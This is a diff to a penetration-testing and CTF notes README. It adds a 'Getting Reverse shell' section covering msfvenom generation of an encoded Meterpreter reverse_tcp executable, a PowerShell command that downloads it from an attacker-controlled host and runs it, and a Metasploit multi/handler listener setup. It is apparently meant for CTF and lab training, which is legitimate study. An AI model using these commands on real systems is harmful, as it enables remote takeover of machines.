@@ -4,16 +4,26 @@ The purspose of this site is to make the Penetration testing and Privilege escat
 
 In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.
 
+### Getting Revese shell
+
+```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+```
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+```
+
+Once this is running, enter this command to start the reverse shell
+
+```Start-Process "shell-name.exe"
+
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
+
+```
+
 
 ### Random Exploit collection
 
 Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.
-| Name     | Character |
-| ---      | ---       |
-| Backtick | `         |
-| Pipe     | \|        |
-
-Another table
 
 |s.no| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
 | --- | --- | --- | --- | --- | --- | --- |
